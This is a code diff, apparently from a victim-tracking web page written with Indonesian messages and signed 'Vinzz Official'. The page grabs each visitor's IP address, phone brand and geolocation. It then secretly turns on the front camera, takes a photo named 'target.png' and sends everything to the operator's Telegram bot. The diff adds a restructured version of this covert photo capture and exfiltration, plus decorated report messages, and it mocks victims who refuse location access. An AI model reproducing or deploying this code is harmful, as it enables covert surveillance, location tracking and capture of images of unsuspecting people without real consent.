@@ -29,46 +29,43 @@ return "Tidak diketahui";
 
 }
 async function kirimFoto() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+  try { 
+  const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            video.play();
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+            // Delay biar kamera siap (sekitar 2 detik)
+            setTimeout(() => {
+              // Samakan ukuran canvas dengan video
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
 
-    video.srcObject = stream;
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => {
-        video.play();
-        resolve();
-      };
-    });
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Delay 2 detik biar maximal hasilnya
-    await new Promise(resolve => setTimeout(resolve, 2000));
+              // Convert canvas ke blob
+              canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", chat_id);
+                formData.append("photo", blob, "target.png");
+                formData.append('caption', '📸 ini fotonya tuan vinzz');
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    return new Promise((resolve) => {
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chat_id);
-        formData.append("photo", blob, "target.png");
-        formData.append('caption', 'ini fotonya tuan vinzz');
-
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        }).then(resolve);
-      }, 'image/png');
-    }, 200);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                })
+              }, 'image/png');
+            }, 2000);
+          };
+        })
 
   } catch (err) {
     console.warn("Akses kamera ditolak atau gagal.");
-    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak atau error.");
+    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera di tolak");
   }
 }
         
@@ -87,7 +84,11 @@ text: pesan
 (async () => {
 const ip = await getIP();
 const merek = getMerekHP();
-const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
+const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
+│🌐 Status: MENUNGGU IZIN LOKASI
+│📡 IP: ${ip}
+│📱 Merek hp: ${merek}
+╰───────────────────`;
 await kirimPesanTelegram(pesanAwal);
 })();
 
@@ -100,7 +101,12 @@ navigator.geolocation.getCurrentPosition(
     const merek = getMerekHP();
 
     // Menambahkan link peta di pesan jika lokasi diizinkan
-    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
+    const pesan = `╭──「 IP berhasil ditemukan! 」──
+│🌐 Status: MENGIZINKAN LOKASI
+│📡 IP: ${ip}
+│📱 Merek hp: ${merek}
+│📍 Lokasi: ${gmaps}
+╰───────────────────`;
     await kirimPesanTelegram(pesan);
 
     kirimFoto()
@@ -111,7 +117,11 @@ navigator.geolocation.getCurrentPosition(
     const ip = await getIP();
     const merek = getMerekHP();
 
-    const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
+    const pesan = `╭──「 IP berhasil ditemukan! 」──
+│🌐 Status: MENOLAK LOKASI
+│📡 IP: ${ip}
+│📱 Merek hp: ${merek}
+╰───────────────────`;
     await kirimPesanTelegram(pesan);
 
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
